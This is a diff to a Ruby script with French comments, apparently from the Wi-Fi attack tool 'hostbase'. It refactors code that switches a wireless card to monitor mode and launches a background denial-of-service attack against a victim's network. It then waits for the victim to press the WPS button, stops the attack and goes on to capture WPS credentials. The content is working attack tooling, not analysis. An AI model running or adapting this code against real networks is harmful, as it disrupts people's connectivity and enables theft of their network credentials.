@@ -21,6 +21,7 @@ sleep 1
 `killall xterm`
 `killall dhcpd`
 `killall wash`
+`killall bash`
 `killall wpa_supplicant`
 Dir.chdir '/tmp/hostbase-1.4FR'
 sleep 1
@@ -76,6 +77,8 @@ sleep 4
 `systemctl start NetworkManager.service`
 sleep 5
 `rm -rf /var/lib/dhcp/dhcpd.leases`
+`killall wash`
+`killall bash`
 puts "Bye..."
 exit
 end
@@ -90,44 +93,39 @@ system "ip link set #{$cartedos} down"
 `iw dev #{$cartedos} set type monitor`
 sleep 5
 `ip link set #{$cartedos} up`
-Setup.activeDos
+Selection.activeDos
 end
 
 def self.activeDos
 puts "Lancement de la DoS..."
 dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
-Setup.victimeAttente  # on appelle la fonction dont on a besoin
+Selection.victimeAttente  # on appelle la fonction dont on a besoin
 sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
 end
 
 
-def self.victimeAttente   
-Dir.chdir '/tmp/hostbase-1.4FR'
-sleep 2
-load 'historique.rb'
-puts "En attende d'une connexion... ctrl+c pour sortir..."
-wash = Thread.new do
-  while true
-    system "wash -i #{$cartedos} -b #{$apmac} -j > wash.txt"   # On lance hostapd_cli wps_pbc en tant que thread
-sleep(20)     # Temps avant la relance de la commande
-  end
-end
-Setup.wpsPush # on appelle la fonction dont on a besoin
+def self.victimeAttente      
+puts "Lancement de wash..."
+wash = Thread.new { `bash wash.sh` }
+Selection.wpsPush # on appelle la fonction dont on a besoin
 sleep(5000000)        
        # Lancement de hostapd_cli a rajouter ici
        # Appel du script rogueinit et/ou de la méthode correspondante
        # Voir nohup ou xterm -e
    end
    
+   
    def self.wpsPush 
 Dir.chdir '/tmp/hostbase-1.4FR'
 sleep 2
+puts "En attente d'une connexion... ctrl+c pour sortir..."
 until File.read('wash.txt').include?('wps_selected_registrar')
 sleep 1
 end
 puts "\e[1;32m[[*] Un utilisateur s'est connecté et le bouton WPS a été appuyé...\e[0m"
 puts "\e[1;32m[*] Arret de la DoS...\e[0m"
 Process.kill 15, File.read('/tmp/terminal.pid').to_i
+Process.kill 15, File.read('/tmp/hostbase-1.4FR/wash.pid').to_i
 `killall wash`
 if File.exist?("terminalfrequence.pid")
 sleep 1
@@ -164,7 +162,7 @@ wpacli = Thread.new do
     sleep(20) # Temps avant la relance de la commande
   end
 end
-Setup.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
+Selection.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
  sleep(5000000)
 end
 
